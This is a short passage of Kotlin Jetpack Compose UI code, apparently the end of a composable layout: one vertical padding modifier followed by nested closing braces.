                                                modifier = Modifier.padding(vertical = 4.dp)
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
